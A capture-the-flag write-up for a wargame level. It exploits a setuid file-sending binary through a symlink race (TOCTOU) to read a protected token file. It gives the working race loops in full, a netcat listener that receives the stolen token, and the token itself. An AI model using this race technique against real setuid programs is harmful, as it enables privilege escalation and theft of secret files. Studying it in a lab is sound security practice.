## Level 10

At this level, we have an executable that will send a file to a remote host.

```bash
ls -l
        -rwsr-s---+ 1 flag10 level10 8617 Mar  5  2016 level10
        -rw-------  1 flag10 flag10    26 Mar  5  2016 token
```
We can create a symlink to try to read the content in the token file (symlink race)

```bash
ln -s /home/user/level10/token /tmp/flag
```
Now let's try to send my file to the server

```bash
./level10 /tmp/flag 192.168.56.101
```
You don't have access to /tmp/flag
```bash
cat /tmp/flag
    cat: /tmp/flag: Permission denied
```

Nope, still unable to execute my flag and send it to a server

To open a port in your machine:
```bash
nc -lk 6969
```

let's get the executable to my host with scp

```bash
scp -P 4242 level10@192.168.56.101:/tmp/flag /mnt/nfs/homes/emaugale/Desktop
```

So must find a way to make your file accessible to the server.
When we use ltrace, the executable will first try to access our file and then read the file's content. -> Do a /tmp/flag file with nothing on it when accessed; we can delete it and recreate one, which will be a symlink to the token file, launch our server, and print the result

```bash
    while true;
        do
        touch /tmp/link
        rm -f /tmp/link
        ln -s /home/user/level10/token /tmp/link
        rm -f /tmp/link
        done
```

```bash
    while true;
    do
    /home/user/level10/level10 /tmp/link 192.168.56.101 2> /dev/null
    done
...
bash /tmp/script1.sh & bash /tmp/script2.sh
```

Check flag.Here is your token : feulo4b72j7edeahuete3no7c
